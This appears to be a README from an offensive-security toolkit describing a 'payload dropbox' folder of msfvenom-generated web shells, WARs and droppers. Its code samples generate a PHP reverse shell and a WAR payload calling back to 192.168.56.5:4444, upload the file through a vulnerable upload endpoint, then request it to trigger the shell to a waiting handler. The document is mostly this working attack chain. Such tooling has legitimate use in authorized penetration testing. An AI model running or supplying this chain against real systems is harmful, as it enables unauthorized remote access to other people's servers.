# Payload Dropbox

Generated payload artifacts land here (msfvenom output — web shells, WARs,
stagers, ELF/EXE droppers). This directory is **gitignored** — generated
munitions never get committed.

Generate (default output root is this folder; override via `MSFVENOM_DROPBOX`):

```python
from payloads.msfvenom_tools import generate_payload
generate_payload("php/reverse_php", lhost="192.168.56.5", lport=4444)
generate_payload(preset="war", lhost="192.168.56.5", lport=4444)
```

List what's available, then push through a vulnerable upload endpoint with the
stateful web lane:

```python
from payloads.msfvenom_tools import list_dropbox
list_dropbox()

from auxiliaries.web_session import session_upload
session_upload("http://target/upload.php",
               file_path="<out_path from generate_payload>",
               file_field="file")
# then session_get the uploaded file's URL to trigger the callback — the
# handler started via generate_payload(start_handler=True) catches it.
```